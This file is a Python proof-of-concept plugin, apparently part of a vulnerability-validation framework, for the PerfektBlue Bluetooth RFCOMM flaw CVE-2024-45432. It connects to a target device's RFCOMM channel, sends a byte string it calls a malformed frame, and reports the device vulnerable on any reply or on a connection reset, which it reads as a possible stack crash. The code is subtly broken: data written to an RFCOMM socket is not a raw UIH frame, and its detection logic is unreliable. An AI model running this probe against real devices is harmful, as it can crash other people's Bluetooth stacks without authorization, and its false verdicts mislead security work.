#!/usr/bin/env python3
"""
PoC Name: BlueSDK RFCOMM Confusion (PerfektBlue)
CVE: CVE-2024-45432
Component: Wireless Stack
Category: Wireless
Severity: High
CVSS: 7.5
Description: BlueSDK RFCOMM函数调用参数错误导致信息泄露
Prerequisites: Linux蓝牙适配器, 目标设备运行BlueSDK栈。
Usage: python3 12_CVE_2024_45432_BT_PerfektBlue_RFCOMM_Active_Validation.py <target_mac>
"""
from __future__ import annotations

import sys
import socket
from iv_plugin_base import IVIVulnerabilityPlugin
VULN = {
    "id":             0,
    "cve":            "CVE-2024-45432",
    "year":           2024,
    "domain":         "wireless",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "BT PerfektBlue RFCOMM",
    "source_url":     "https://nvd.nist.gov/vuln/detail/CVE-2024-45432",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://nvd.nist.gov/vuln/detail/CVE-2024-45432"],
    "signature_tokens": ["CVE-2024-45432"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CVE-2024-45432 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CVE-2024-45432") if vuln else "CVE-2024-45432",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class PerfektBlueRFCOMMPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-012"
    meta_poc_name = 'CVE-2024-45432 BT PerfektBlue RFCOMM Active Validation'
    meta_cve_id = "CVE-2024-45432"
    meta_source_url = "https://nvd.nist.gov/vuln/detail/CVE-2024-45432"
    meta_references = ['https://nvd.nist.gov/vuln/detail/CVE-2024-45432']
    meta_severity = "High"
    meta_protocol = "bluetooth"
    meta_profiles = ["bluetooth"]
    meta_target_os = ["all"]
    meta_required_params = ["bd_addr"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        if not self.params.get("bd_addr"):
            raise RuntimeError("需要指定目标蓝牙MAC地址")
        return True
    def exploit(self):
        target = self.params["bd_addr"]
        self.logger.info(f"PerfektBlue RFCOMM参数混淆测试: {target}")
        self.logger.info("CVE-2024-45432: BlueSDK RFCOMM函数参数错误")
        try:
            s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
            s.settimeout(5)
            s.connect((target, 1))
            self.logger.info("[+] RFCOMM通道1连接成功")
            # Send abnormal RFCOMM UIH frame with wrong DLCI parameter
            malformed = b"\x03\xEF\x09" + b"\x00" * 64  # Wrong DLCI + oversize
            s.send(malformed)
            self.logger.info("[*] 发送畸形RFCOMM UIH帧...")
            try:
                resp = s.recv(1024)
                if resp:
                    self.logger.warning(f"[+] 收到异常响应({len(resp)}B): 可能存在RFCOMM参数漏洞")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"Abnormal RFCOMM response: {len(resp)} bytes"
            except socket.timeout:
                self.logger.info("未收到异常响应")
                self.results["vulnerable"] = False
            except (ConnectionResetError, BrokenPipeError):
                self.logger.warning("[+] 连接重置 - 可能导致了栈崩溃！")
                self.results["vulnerable"] = True
                self.results["evidence"] = "RFCOMM connection reset after malformed frame"
            s.close()
        except Exception as e:
            self.logger.info(f"蓝牙连接失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 12_CVE_2024_45432_BT_PerfektBlue_RFCOMM_Active_Validation.py <target_mac>")
        sys.exit(1)
    plugin = PerfektBlueRFCOMMPlugin({"target_ip": "N/A", "bd_addr": sys.argv[1]})
    plugin.run_verify()
